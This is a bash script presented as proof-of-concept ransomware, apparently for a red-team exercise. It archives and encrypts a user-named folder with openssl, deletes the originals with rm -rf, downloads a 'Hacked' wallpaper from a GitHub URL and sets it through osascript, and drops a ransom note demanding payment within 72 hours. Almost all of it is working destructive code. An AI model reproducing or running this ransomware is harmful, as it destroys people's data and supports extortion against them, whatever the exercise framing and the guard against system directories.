#!/usr/bin/env bash
# encrypt-folder.sh
# PoC ransomware: encrypt ONE folder that the user supplies.

set -euo pipefail

usage() {
    echo "Usage: $0 <folder_to_encrypt>"
    exit 1
}

# ---- 1. Validate input -------------------------------------------------------
[[ $# -eq 1 ]] || usage
TARGET="$(realpath "$1")"

if [[ ! -d "$TARGET" ]]; then
    echo "Error: '$TARGET' is not a directory."
    exit 1
fi

# Never allow '/' or a top-level system directory
for BAD in / /bin /lib /lib64 /usr /etc /dev /proc /sys /run; do
    [[ "$TARGET" == "$BAD" || "$TARGET" == "$BAD/"* ]] && {
        echo " Refusing to operate on system directory '$TARGET'."
        exit 1
    }
done

# ---- 2. Collect or prompt for password --------------------------------------
PASSWORD="${PASSWORD:-}"
if [[ -z "$PASSWORD" ]]; then
    read -rsp "Enter encryption password: " PASSWORD
    echo
fi

# ---- 3. Derive paths ---------------------------------------------------------
BASENAME="$(basename "$TARGET")"
PARENT_DIR="$(dirname  "$TARGET")"
ARCHIVE="${PARENT_DIR}/${BASENAME}.tar.gz"
ENCRYPTED="${PARENT_DIR}/${BASENAME}.enc"
README="$HOME/Desktop/YOU_ARE_Hacked.txt"

# ---- 4. Create archive and encrypt ------------------------------------------
echo "Archiving '$TARGET' → '$ARCHIVE' ..."
tar -czf "$ARCHIVE" -C "$PARENT_DIR" "$BASENAME"

echo "Encrypting archive → '$ENCRYPTED' ..."
openssl enc -aes-256-cbc -salt -in "$ARCHIVE" -out "$ENCRYPTED" -pass pass:"$PASSWORD"

# ---- 5. Destroy originals ----------------------------------------------------
echo "   Removing original folder and temporary archive ..."
rm -rf "$TARGET" "$ARCHIVE"

# ---- 6. Drop ransom note and update wallpaper-----------------------------------------------------
curl -o ~/Desktop/Hacked.jpg https://raw.githubusercontent.com/sectorxatwork/Ransom_nuke_it/main/Hacked.jpg
osascript -e 'tell application "System Events" to set picture of every desktop to "~/Desktop/Hacked.jpg"'


cat > "$README" <<EOL
Dear User,

Your files in '$BASENAME' have been locked with AES-256 encryption.
Pay **2000 BluePoints** to the PTC Team to receive the decryption key.

⚠  You have 72 hours before the price doubles. After 7 days the data is
deleted forever. Do not attempt recovery on your own.

— PTC Red Team
EOL

echo "  Done. Encrypted data: $ENCRYPTED"
echo "   Ransom note:          $README"
